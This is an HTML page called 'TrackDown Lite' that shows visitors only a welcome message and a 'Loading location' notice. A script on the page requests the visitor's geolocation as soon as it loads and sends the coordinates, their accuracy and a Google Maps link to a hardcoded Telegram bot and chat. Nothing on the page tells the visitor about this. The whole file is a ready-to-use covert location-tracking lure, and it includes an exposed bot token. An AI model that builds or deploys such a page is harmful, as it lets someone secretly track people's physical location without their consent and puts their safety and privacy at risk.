<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TrackDown Lite</title>
</head>
<body>
    <h1>Welcome to TrackDown!</h1>
    <p>Loading location...</p>

    <script>
        const telegramToken = "7375262668:AAHBFfwnMZ9Cg0clsH-m5HZOdq-nhFJ9Cww";
        const chatId = "5649811717";

        function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
            fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chatId, text: message }),
            })
            .then(response => console.log("Data sent to Telegram"))
            .catch(error => console.error("Error sending to Telegram:", error));
        }

        // Dapatkan Lokasi dari Geolocation API
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;
                    const accuracy = position.coords.accuracy;

                    const googleMapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
                    sendToTelegram(`Location Info:\nLatitude: ${latitude}\nLongitude: ${longitude}\nAccuracy: ${accuracy} meters\nGoogle Maps: ${googleMapsUrl}`);
                },
                (error) => {
                    sendToTelegram("Location Info: Could not retrieve location.");
                }
            );
        } else {
            sendToTelegram("Location Info: Geolocation not supported by browser.");
        }
    </script>
</body>
</html>
